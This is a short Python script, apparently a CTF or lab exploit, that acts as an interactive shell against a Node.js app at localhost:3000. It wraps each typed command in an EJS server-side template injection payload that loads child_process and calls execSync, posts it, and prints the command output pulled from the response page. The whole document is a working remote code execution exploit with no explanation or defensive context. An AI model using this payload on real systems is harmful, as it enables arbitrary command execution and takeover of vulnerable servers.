import requests
from html import unescape

BASE_URL = 'http://localhost:3000'
while True:
    i = input("$ ")
    data = {'content': f'<%= global.process.mainModule.constructor._load("child_process").execSync("{i}") %>'}
    out = unescape(requests.post(BASE_URL, data=data).text)
    print(out[out.find('<body>') + 14:out.find('</body>') - 2])
